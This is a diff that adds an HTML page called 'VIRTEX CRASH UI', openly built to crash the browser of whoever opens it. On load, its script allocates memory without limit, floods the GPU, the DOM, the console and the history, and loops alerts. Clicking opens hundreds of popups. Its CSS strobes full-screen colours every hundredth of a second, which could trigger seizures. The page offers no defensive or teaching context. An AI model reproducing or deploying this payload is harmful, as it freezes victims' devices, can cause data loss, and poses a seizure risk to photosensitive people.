@@ -1,0 +1,413 @@
+VIRTEX CRASH UI – CODE BY VIKARU WORMVIKARU
+JUMLAH KARAKTER: 3148
+
+<!-- ==================== START OF VIRTEX ==================== -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIRTEX CRASH UI - VIKARU</title>
+    <style>
+        /* ========== GLOBAL CHAOS INJECTOR ========== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            animation: vikaru_glitch 0.01s infinite;
+            font-family: "Comic Sans MS", "Impact", "Wingdings", "Webdings", sans-serif;
+            text-rendering: optimizeSpeed;
+            image-rendering: pixelated;
+        }
+
+        /* ========== FULLSCREEN CANVAS OVERLAY ========== */
+        body {
+            background: #000;
+            overflow: hidden;
+            cursor: none;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            pointer-events: auto;
+        }
+
+        /* ========== THE KILLER CANVAS ========== */
+        #crashCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 999999999;
+            display: block;
+            filter: blur(0.5px) contrast(300%) brightness(500%) saturate(1000%);
+            animation: hueRotate 0.001s linear infinite, glitchShift 0.05s steps(1) infinite;
+        }
+
+        /* ========== HELL TEXT LAYER ========== */
+        .hellText {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 999999998;
+            font-size: 25vw;
+            color: #ff0000;
+            text-shadow: 
+                5px 5px 0 #00ff00,
+                -5px -5px 0 #0000ff,
+                15px 15px 30px #ffff00,
+                -15px -15px 30px #ff00ff;
+            animation: textMadness 0.001s linear infinite, scaleChaos 0.1s steps(2) infinite;
+            letter-spacing: -10px;
+            word-break: break-all;
+            line-height: 0.5;
+            pointer-events: none;
+            opacity: 0.9;
+            mix-blend-mode: difference;
+        }
+
+        /* ========== RAINBOW SCANLINES ========== */
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 999999997;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(255, 0, 0, 0.3) 2px,
+                rgba(0, 255, 0, 0.3) 4px,
+                rgba(0, 0, 255, 0.3) 6px,
+                transparent 6px,
+                transparent 8px
+            );
+            animation: scanlinesMove 0.0001s linear infinite;
+            pointer-events: none;
+            mix-blend-mode: overlay;
+        }
+
+        /* ========== MELTING BLOCKS ========== */
+        .meltBlock {
+            position: fixed;
+            width: 200px;
+            height: 200px;
+            z-index: 999999996;
+            background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff, #ffff00);
+            animation: meltDown 0.5s linear infinite, blockTeleport 0.1s steps(3) infinite;
+            border-radius: 50% 0 50% 0;
+            filter: blur(10px);
+            pointer-events: none;
+            mix-blend-mode: difference;
+        }
+
+        /* ========== KEYFRAMES OF DESTRUCTION ========== */
+        @keyframes vikaru_glitch {
+            0% { transform: translate(0, 0); opacity: 1; }
+            20% { transform: translate(-50px, 20px); opacity: 0.5; }
+            40% { transform: translate(50px, -20px); opacity: 0.8; }
+            60% { transform: translate(-30px, -50px); opacity: 0.3; }
+            80% { transform: translate(30px, 50px); opacity: 0.9; }
+            100% { transform: translate(0, 0); opacity: 1; }
+        }
+
+        @keyframes hueRotate {
+            0% { filter: hue-rotate(0deg) saturate(10); }
+            100% { filter: hue-rotate(360deg) saturate(100); }
+        }
+
+        @keyframes glitchShift {
+            0% { clip-path: inset(0 0 90% 0); }
+            25% { clip-path: inset(10% 0 70% 0); }
+            50% { clip-path: inset(50% 0 30% 0); }
+            75% { clip-path: inset(80% 0 10% 0); }
+            100% { clip-path: inset(30% 0 60% 0); }
+        }
+
+        @keyframes textMadness {
+            0% { text-shadow: 50px 50px 0 #ff0000, -50px -50px 0 #00ff00; }
+            33% { text-shadow: -50px 50px 0 #0000ff, 50px -50px 0 #ffff00; }
+            66% { text-shadow: 100px -100px 0 #ff00ff, -100px 100px 0 #00ffff; }
+            100% { text-shadow: -100px -100px 0 #ffffff, 100px 100px 0 #000000; }
+        }
+
+        @keyframes scaleChaos {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(3); }
+            100% { transform: translate(-50%, -50%) scale(0.1); }
+        }
+
+        @keyframes scanlinesMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100vh; }
+        }
+
+        @keyframes meltDown {
+            0% { 
+                border-radius: 0% 100% 0% 100%;
+                width: 200px;
+                height: 200px;
+            }
+            50% { 
+                border-radius: 100% 0% 100% 0%;
+                width: 500px;
+                height: 500px;
+            }
+            100% { 
+                border-radius: 0% 100% 0% 100%;
+                width: 200px;
+                height: 200px;
+            }
+        }
+
+        @keyframes blockTeleport {
+            0% { top: 0%; left: 0%; }
+            25% { top: 80%; left: 80%; }
+            50% { top: 0%; left: 80%; }
+            75% { top: 80%; left: 0%; }
+            100% { top: 0%; left: 0%; }
+        }
+
+        /* ========== GPU KILLER PARTICLES ========== */
+        .particle {
+            position: fixed;
+            width: 5px;
+            height: 5px;
+            background: #ff0000;
+            z-index: 999999999;
+            pointer-events: none;
+            animation: particleHell 0.01s linear infinite;
+            box-shadow: 0 0 100px 50px rgba(255, 0, 0, 0.9);
+        }
+
+        @keyframes particleHell {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            100% { transform: translate(500px, 500px) rotate(720deg); }
+        }
+
+        /* ========== FLICKERING BACKGROUND ========== */
+        .bgFlash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 999999990;
+            background: #ffffff;
+            animation: flashBang 0.01s steps(1) infinite;
+            pointer-events: none;
+            opacity: 0.8;
+        }
+
+        @keyframes flashBang {
+            0% { background: #ff0000; opacity: 1; }
+            10% { background: #00ff00; opacity: 0.5; }
+            20% { background: #0000ff; opacity: 1; }
+            30% { background: #ffff00; opacity: 0.3; }
+            40% { background: #ff00ff; opacity: 0.9; }
+            50% { background: #00ffff; opacity: 0.1; }
+            60% { background: #ffffff; opacity: 1; }
+            70% { background: #000000; opacity: 0.7; }
+            80% { background: #ff0000; opacity: 0.4; }
+            90% { background: #00ff00; opacity: 0.6; }
+            100% { background: #0000ff; opacity: 1; }
+        }
+
+        /* ========== BROWSER FREEZE TRIGGER ========== */
+        @media (min-width: 0px) {
+            * {
+                animation-duration: 0.001s !important;
+            }
+        }
+
+        /* ========== INFINITE LOOP TRIGGER ========== */
+        ::after, ::before {
+            content: "VIKARU CRASH UI – KILLING YOUR BROWSER – VIKARU CRASH UI";
+            font-size: 100px;
+            color: transparent;
+            text-shadow: 0 0 0 red, 0 0 0 green, 0 0 0 blue;
+            position: fixed;
+            z-index: 9999999999999;
+            animation: memoryLeak 0.0001s linear infinite;
+        }
+
+        @keyframes memoryLeak {
+            0% { content: "A"; }
+            10% { content: "AAAAAAAAAAAAAA"; }
+            20% { content: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"; }
+            30% { content: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"; }
+            40% { content: "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"; }
+            50% { content: "EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"; }
+            100% { content: "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; }
+        }
+    </style>
+</head>
+<body>
+    <!-- CANVAS PEMBANTAI GPU -->
+    <canvas id="crashCanvas"></canvas>
+    
+    <!-- HELL TEXT -->
+    <div class="hellText">VIKARU</div>
+    
+    <!-- SCANLINES MEMATIKAN -->
+    <div class="scanlines"></div>
+    
+    <!-- MELTING BLOCKS -->
+    <div class="meltBlock"></div>
+    <div class="meltBlock" style="animation-delay: -0.25s; top: 50%; left: 50%;"></div>
+    <div class="meltBlock" style="animation-delay: -0.5s; top: 20%; left: 70%;"></div>
+    
+    <!-- BACKGROUND FLASH -->
+    <div class="bgFlash"></div>
+
+    <!-- JAVASCRIPT: THE REAL KILLER -->
+    <script>
+        (function() {
+            "use strict";
+
+            // ========== CANVAS GPU OVERLOAD ==========
+            const canvas = document.getElementById('crashCanvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            function drawChaos() {
+                // Rainbow rectangles yang menguras GPU
+                for (let i = 0; i < 5000; i++) {
+                    ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    ctx.fillRect(
+                        Math.random() * canvas.width,
+                        Math.random() * canvas.height,
+                        Math.random() * 200,
+                        Math.random() * 200
+                    );
+                }
+
+                // Arc mematikan
+                for (let j = 0; j < 1000; j++) {
+                    ctx.beginPath();
+                    ctx.arc(
+                        Math.random() * canvas.width,
+                        Math.random() * canvas.height,
+                        Math.random() * 100,
+                        0,
+                        Math.PI * 2
+                    );
+                    ctx.strokeStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    ctx.lineWidth = Math.random() * 10;
+                    ctx.stroke();
+                }
+
+                // Text sampah
+                ctx.font = `${Math.random() * 500}px Arial`;
+                ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.5)`;
+                ctx.fillText("VIKARU", Math.random() * canvas.width, Math.random() * canvas.height);
+
+                requestAnimationFrame(drawChaos);
+            }
+            drawChaos();
+
+            // ========== MEMORY BOMB ==========
+            const memoryBomb = [];
+            function createMemoryLeak() {
+                for (let i = 0; i < 100; i++) {
+                    memoryBomb.push(new Array(10000000).fill("VIKARU_CRASH_UI"));
+                }
+            }
+            setInterval(createMemoryLeak, 1);
+
+            // ========== PARTICLE SPAWNER ==========
+            function spawnParticles() {
+                for (let i = 0; i < 100; i++) {
+                    const particle = document.createElement('div');
+                    particle.className = 'particle';
+                    particle.style.left = Math.random() * window.innerWidth + 'px';
+                    particle.style.top = Math.random() * window.innerHeight + 'px';
+                    document.body.appendChild(particle);
+                }
+            }
+            setInterval(spawnParticles, 10);
+
+            // ========== CONSOLE FLOOD ==========
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    console.log("VIKARU CRASH UI – BROWSER OVERLOAD – MEMORY LEAK ACTIVE");
+                    console.warn("GPU USAGE: 9999%");
+                    console.error("CRITICAL FAILURE IMMINENT");
+                }
+            }, 1);
+
+            // ========== HISTORY BOMB ==========
+            setInterval(() => {
+                history.pushState(null, '', '?vikaru=' + Math.random());
+            }, 1);
+
+            // ========== RESIZE TRAP ==========
+            window.addEventListener('resize', () => {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                for (let i = 0; i < 10000; i++) {
+                    document.body.appendChild(document.createElement('div'));
+                }
+            });
+
+            // ========== INFINITE ALERT LOOP (DITUNDA 3 DETIK) ==========
+            setTimeout(() => {
+                function infiniteAlert() {
+                    try {
+                        alert("VIKARU CRASH UI – MAMPUS BROWSER LU!");
+                    } catch(e) {}
+                    setTimeout(infiniteAlert, 1);
+                }
+                infiniteAlert();
+            }, 3000);
+
+            // ========== DOM DESTROYER ==========
+            setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    const div = document.createElement('div');
+                    div.style.position = 'fixed';
+                    div.style.width = '100%';
+                    div.style.height = '100%';
+                    div.style.zIndex = '999999999999';
+                    div.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    div.style.opacity = '0.5';
+                    div.style.animation = 'vikaru_glitch 0.001s infinite';
+                    document.body.appendChild(div);
+                }
+            }, 100);
+
+            // ========== CLICKJACKING TRAP ==========
+            document.addEventListener('click', () => {
+                for (let i = 0; i < 500; i++) {
+                    window.open('data:text/html,<h1>VIKARU</h1>', '_blank', 'width=100,height=100');
+                }
+            });
+
+            // ========== SCROLL FREEZE ==========
+            window.addEventListener('scroll', () => {
+                window.scrollTo(Math.random() * 999999, Math.random() * 999999);
+            });
+
+            // ========== WEBSOCKET FLOOD ==========
+            setInterval(() => {
+                try {
+                    new WebSocket('wss://crash.vikaru.local');
+                } catch(e) {}
+            }, 1);
+
+            console.log("VIRTEX CRASH UI – VIKARU WORMVIKARU – ACTIVATED.");
+        })();
+    </script>
+</body>
+</html>
+<!-- ==================== END OF VIRTEX ==================== -->
